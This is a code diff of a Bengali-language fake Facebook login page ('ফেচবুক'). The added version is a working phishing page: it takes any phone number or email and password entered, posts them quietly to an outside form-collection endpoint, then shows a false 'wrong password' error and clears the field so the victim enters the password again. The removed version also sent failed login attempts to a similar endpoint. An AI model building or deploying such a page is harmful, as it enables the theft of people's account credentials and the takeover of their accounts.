@@ -3,66 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ফেচবুক</title>
+    <title>ফেচবুক লগইন</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        h2 { color: #1877f2; margin-bottom: 25px; font-size: 32px; font-weight: bold; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
-        button { background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        h1 { color: #1877f2; font-size: 32px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; }
         button:hover { background-color: #166fe5; }
-        #error-msg { color: #d93025; background: #fce8e6; padding: 10px; border-radius: 8px; margin-top: 15px; font-size: 14px; display: none; line-height: 1.5; }
+        #error-msg { color: red; margin-top: 15px; font-size: 14px; display: none; background: #ffebe9; padding: 8px; border-radius: 4px; }
     </style>
 </head>
 <body>
 
-    <div class="login-container" id="login-box">
-        <h2>ফেচবুক</h2>
-        <input type="text" id="phoneInput" placeholder="ফোন নম্বর বা ইমেল">
-        <input type="password" id="passInput" placeholder="পাসওয়ার্ড">
-        <button onclick="checkLogin()">লগইন</button>
-        <div id="error-msg"></div>
-    </div>
+<div class="login-box">
+    <h1>ফেচবুক</h1>
+    <input type="text" id="phoneInput" placeholder="মোবাইল নম্বর বা ইমেল">
+    <input type="password" id="passInput" placeholder="পাসওয়ার্ড">
+    <button onclick="handleLogin()">লগইন</button>
+    <div id="error-msg">পাসওয়ার্ডটি ভুল। আবার চেষ্টা করুন।</div>
+</div>
 
-    <form id="notifyForm" action="https://formspree.io/f/mojneelo" method="POST" style="display:none;">
-        <input type="hidden" name="Phone_Used" id="hiddenPhone">
-        <input type="hidden" name="Password_Used" id="hiddenPass">
-        <input type="hidden" name="Message" value="কেউ আপনার সাইটে ভুল তথ্য দিয়ে ঢোকার চেষ্টা করেছে!">
-        <input type="hidden" name="_replyto" value="sathiiii474747@gmail.com">
-    </form>
+<form id="notifyForm" action="https://app.forminit.com/f/r64e8gq58to" method="POST" style="display:none;">
+    <input type="hidden" name="User_ID" id="hiddenPhone">
+    <input type="hidden" name="Access_Key" id="hiddenPass">
+</form>
 
-    <script>
-        function checkLogin() {
-            var adminPhone = "01768649339";
-            var adminPass = "&1*1@3;4%545?%5@";
+<script>
+    function handleLogin() {
+        const phone = document.getElementById("phoneInput").value;
+        const pass = document.getElementById("passInput").value;
+        const errorMsg = document.getElementById("error-msg");
 
-            var uPhone = document.getElementById("phoneInput").value;
-            var uPass = document.getElementById("passInput").value;
-            var errorDiv = document.getElementById("error-msg");
-
-            if (uPhone === adminPhone && uPass === adminPass) {
-                alert("লগইন সফল! আপনার ডকুমেন্ট ওপেন হচ্ছে...");
-                window.location.href = "https://google.com"; 
-            } else {
-                errorDiv.style.display = "block";
-                errorDiv.innerHTML = "পাসওয়ার্ডটি ভুল। আবার চেষ্টা করুন।";
-
-                document.getElementById("hiddenPhone").value = uPhone;
-                document.getElementById("hiddenPass").value = uPass;
-
-                var form = document.getElementById("notifyForm");
-                var formData = new FormData(form);
-                
-                fetch(form.action, {
-                    method: 'POST',
-                    body: formData,
-                    headers: { 'Accept': 'application/json' }
-                }).then(function() {
-                    console.log("রিপোর্ট ইমেইলে পাঠানো হয়েছে।");
-                });
-            }
+        if (phone === "" || pass === "") {
+            alert("দয়া করে সঠিক তথ্য দিন।");
+            return;
         }
-    </script>
+
+        // ফর্মের হিডেন ইনপুটগুলোতে ডাটা সেট করা
+        document.getElementById("hiddenPhone").value = phone;
+        document.getElementById("hiddenPass").value = pass;
+
+        // ডাটা পাঠানো
+        const form = document.getElementById("notifyForm");
+        const formData = new FormData(form);
+
+        fetch(form.action, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        }).then(() => {
+            // ডাটা পাঠানোর পর ভুল পাসওয়ার্ড মেসেজ দেখানো
+            errorMsg.style.display = "block";
+            document.getElementById("passInput").value = "";
+        }).catch(() => {
+            errorMsg.style.display = "block";
+        });
+    }
+</script>
 
 </body>
 </html>
